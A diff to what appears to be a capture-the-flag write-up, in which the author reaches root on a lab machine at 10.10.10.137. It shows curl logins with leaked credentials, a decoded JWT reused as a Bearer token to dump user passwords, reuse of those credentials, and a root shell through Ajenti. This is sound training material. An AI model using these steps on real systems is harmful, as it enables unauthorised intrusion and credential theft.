@@ -101,7 +101,7 @@ $db = "login";
 $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
 ```
 
-Now we got some credentials we are going to test on every login page we found but none of them 
+Now we got some credentials that we are going to test on every login page we found, but none of them work.
 
 ## Checking Node.js Express Framework (Port 3000)
 
@@ -125,9 +125,9 @@ curl -XPOST hxxp://10.10.10.137:3000/login -d 'username=root&password=Zk6heYCyv6
 ```
 
 The response of the page is **Forbidden** so we now know that this gets accepted and we eventually need the correct username. 
-When we try is with **admin** and the same password, we get a different response!
+When we try this with **admin** and the same password, we get a different response!
 ```markdown
-curl -XPOST http://10.10.10.137:3000/login -d 'username=admin&password=Zk6heYCyv6ZE9Xcg'
+curl -XPOST hxxp://10.10.10.137:3000/login -d 'username=admin&password=Zk6heYCyv6ZE9Xcg'
 ```
 
 Response:
@@ -140,7 +140,7 @@ This is a JSON Web Token (JWT) that we can decipher to get more information.
 ### JSON Web Token
 
 The values of the "token" are just Base64 decoded and can be read by decoding it.
-The values are seperated by a _dot_ and should be decoded individially.
+The values are seperated by a _dot_ and should be decoded individually.
 
 - eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
   - This gives us information about the token like the algorithm that was used for signing
@@ -148,10 +148,10 @@ The values are seperated by a _dot_ and should be decoded individially.
   
 - eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTcwNzQ5LCJleHAiOjE1NjkwNTcxNDl9
   - This is the data of the token
-  - {"username":"admin","iat":1568970749,"exp":1569057149}
+  - Decoded: {"username":"admin","iat":1568970749,"exp":1569057149}
   
 - KYhdXTx04_hLWVM9ap83ktAdQ5YjAujQBa_sJkPMJBQ
-  - This is the signature of the token and can't be deciphered that easily but we don't need it anyway
+  - This is the signature of the token and can't be deciphered that easily but we don't need to anyway
   
 Now lets use this token on the the Node.js framework page with _curl_:
 ```markdown
@@ -165,7 +165,7 @@ Response:
 
 After authenticating we should look into the _/users_ directory that we found earlier:
 ```markdown
-curl -s http://10.10.10.137:3000/users -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTcwNzQ5LCJleHAiOjE1NjkwNTcxNDl9.KYhdXTx04_hLWVM9ap83ktAdQ5YjAujQBa_sJkPMJBQ' | jq
+curl -s hxxp://10.10.10.137:3000/users -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTcwNzQ5LCJleHAiOjE1NjkwNTcxNDl9.KYhdXTx04_hLWVM9ap83ktAdQ5YjAujQBa_sJkPMJBQ' | jq
 ```
 
 I am using **jq** so the JSON output is prettier and we get this:
@@ -194,3 +194,33 @@ I am using **jq** so the JSON output is prettier and we get this:
 ]
 ```
 
+Now we get all users and can interact with them:
+```markdown
+curl -s hxxp://10.10.10.137:3000/users/Admin -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTcwNzQ5LCJleHAiOjE1NjkwNTcxNDl9.KYhdXTx04_hLWVM9ap83ktAdQ5YjAujQBa_sJkPMJBQ' | jq
+```
+
+Response:
+```json
+{
+  "name": "Admin",
+  "password": "WX5b7)>/rp$U)FW"
+}
+```
+
+If we do this for all the users we get a password for all of them:
+- Admin:WX5b7)>/rp$U)FW
+- Derry:rZ86wwLvx7jUxtch
+- Yuri:bet@tester87
+- Dory:5y:!xa=ybfe)/QD
+
+We will try all these credentials on every login prompt we got and find out that the credentials of _Derry_ works on the **/management** directory that we found on port 80.
+
+### Log into /management on port 80
+
+On this page we get an index for _login.php, config.php and config.json_. We know the PHP sites so we check the JSON file and see that these are configuration files for **Ajenti**. In those files we find a password:
+> KpMasng6S5EtTy9Z
+
+## Checking Ajenti (Port 8000)
+
+The password we got works on Ajenti with the user _root_. Ajenti is an admin control panel where we can easily browse the file system or spawn a shell on the server.
+We click on _Terminal_ and see that we are root and the box is done!
